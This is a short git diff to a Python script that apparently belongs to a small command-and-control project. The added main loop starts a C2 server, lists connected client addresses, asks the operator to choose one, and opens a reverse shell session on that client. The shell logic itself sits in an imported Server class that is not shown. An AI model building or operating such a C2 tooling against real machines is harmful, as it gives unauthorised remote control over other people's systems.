@@ -4,8 +4,8 @@
 __author__ = 'Karl Boulais'
 
 from argparse import ArgumentParser
+from time import sleep
 
-# Todo 
 from cnc.server import Server
 
 def argParse():
@@ -14,12 +14,33 @@ def argParse():
     return p
 
 
-
 def main():
-    # args = argParse().parse_args()
+    s = Server()
+    s.main()
 
+    printed = False
     while True:
-        pass
+        sleep(0.5)
+
+        if not s.inSession:    
+            if len(s.cSocket) > 0:
+                printed = False
+                choix = None
+                for elem in s.cSocket:
+                    i = s.cSocket.index(elem)
+                    print(f"{i} {s.cAddr[i]}")
+                try:
+                    choix = int(input("\n choix: "))
+                except Exception:
+                    continue
+                if choix is not None:
+                    s.inSession = True
+                    s.startReverseShellInstance(s.cSocket[choix])
+            elif not printed:
+                printed = True
+                print("There is no client...")
+    # args = argParse().parse_args()
+    # display CnC
 
 
 
